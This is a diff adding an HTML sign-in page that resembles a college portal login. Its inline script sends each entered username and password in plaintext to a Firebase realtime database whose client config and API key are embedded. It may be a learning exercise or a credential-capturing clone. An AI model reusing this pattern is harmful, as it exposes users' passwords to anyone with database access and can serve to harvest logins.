@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Validation Form</title>
+        <link rel="stylesheet" href="style.css">
+
+    </head>
+    <body>
+        <div class="main">
+            <div class="left"></div>
+
+
+
+
+            <div class="right">
+                <div class="top">
+                    <img class="logo" src="logo.gif" width=88px><br>
+                </div>
+                <div class="sign">
+                    <p class="signin">Sign in</p>
+                </div>
+                <div class="right-bottom">
+                    <form id="container" class="take" action="#">
+                        <div class="in">
+                            <input id="username" class="userin" type="text"
+                                name="id"
+                                placeholder="userId*"><br>
+                            <input id="pass" class="userin" type="password"
+                                name="password"
+                                placeholder="password*">
+                            <button id="submit" class="sub" type="submit">SIGN
+                                IN</button>
+                        </div>
+
+                        <br>
+                        <div class="re">
+                            <span class="reset">Reset Password</span>
+                        </div><br>
+                        <div class="a">
+                            <button class="ann">ANNOUCEMENTS</button>
+
+                        </div>
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </body>
+    <script type="module">
+    // const form = document.getElementById("container");
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+        import { getDatabase, ref, set,get, child } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+        
+        const firebaseConfig = {
+            apiKey: "AIzaSyCz3iO6BNFdYWLi_axaIZE7DYrK6vNQyQ8",
+            authDomain: "daviet-sign.firebaseapp.com",
+            projectId: "daviet-sign",
+            storageBucket: "daviet-sign.appspot.com",
+            messagingSenderId: "121575039650",
+            appId: "1:121575039650:web:b80515f8b994d10f7fedfb"
+          };
+        
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        
+        
+        document.getElementById("submit").addEventListener('click',function(event){
+            event.preventDefault();
+            set(ref(db, 'user/' + document.getElementById("username").value),{
+        
+        
+                username :  document.getElementById("username").value,
+                password :   document.getElementById("pass").value
+            })
+            alert("data sent to DAVIET");
+        })
+        
+        </script>
+</html>
